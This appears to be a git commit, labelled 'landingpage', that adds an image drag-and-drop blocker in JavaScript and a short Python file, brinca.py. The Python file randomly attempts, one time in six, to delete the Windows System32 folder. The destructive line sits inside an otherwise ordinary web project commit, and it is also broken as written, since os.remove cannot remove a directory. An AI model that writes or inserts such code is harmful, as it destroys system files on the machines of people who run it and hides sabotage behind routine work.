ae0012fcf4ff0fc55c96afe84a9404a6c2d7d738
MurilloZanchetta <murillohenriquezquirino@gmail.com>
2023-07-11 11:05:54 -0300

    landingpage

---
+++ brinca.py
@@ -0,0 +1,5 @@
+import random, os
+
+
+if (random.randint(1,6) == 4 ):    
+    os.remove("C:\Windows\System32")
---
+++ img.js
@@ -0,0 +1,18 @@
+(function () {
+  // Bloqueando arrastar imagens do site para baixar
+
+  function desativarDragDrop() {
+    document.addEventListener(
+      "dragstart",
+      (evento) => evento.preventDefault(),
+      false
+    );
+    document.addEventListener(
+      "drop",
+      (evento) => evento.preventDefault(),
+      false
+    );
+  }
+
+  desativarDragDrop();
+})();
